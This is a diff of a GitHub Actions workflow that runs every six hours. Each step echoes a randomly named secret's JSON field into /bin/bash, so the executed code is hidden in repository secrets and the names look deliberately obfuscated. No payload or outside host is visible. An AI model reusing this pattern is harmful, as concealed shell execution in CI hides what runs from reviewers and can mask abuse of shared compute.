@@ -3,28 +3,18 @@ name: biohazardapricots
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 0/6 * * *'
+    - cron: '47 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: biohazardapricots
         env:
-          rva5: ${{ secrets.rva5 }}
+          afxrm57: ${{ secrets.afxrm57 }}
         run: |
-          echo $rva5 | jq -r .xpnki3 | /bin/bash
-          echo $oklsu801 | jq -r .auxyl547 | /bin/bash
-          echo $aq12 | jq -r .tpww314 | /bin/bash
-          echo $u35 | jq -r .azte84 | /bin/bash
-          echo $r45357 | jq -r .lmg5356 | /bin/bash
-          echo $abs64 | jq -r .eo616 | /bin/bash
-          echo $zrzx91 | jq -r .i8905 | /bin/bash
-          echo $d577 | jq -r .juvkt8 | /bin/bash
-          echo $iti00 | jq -r .nzv3 | /bin/bash
-          echo $ooyjw04646 | jq -r .sjb4 | /bin/bash
-          echo $wroog09706 | jq -r .kcvt6780 | /bin/bash
-          echo $m9 | jq -r .anrkc342 | /bin/bash
-          echo $yw0 | jq -r .hjs4405 | /bin/bash
+          echo $afxrm57 | jq -r .ufs41279 | /bin/bash
+          echo $rou7 | jq -r .vldys39 | /bin/bash
+          echo $v3 | jq -r .s23068 | /bin/bash
+          echo $axli5741 | jq -r .trgw79 | /bin/bash
 
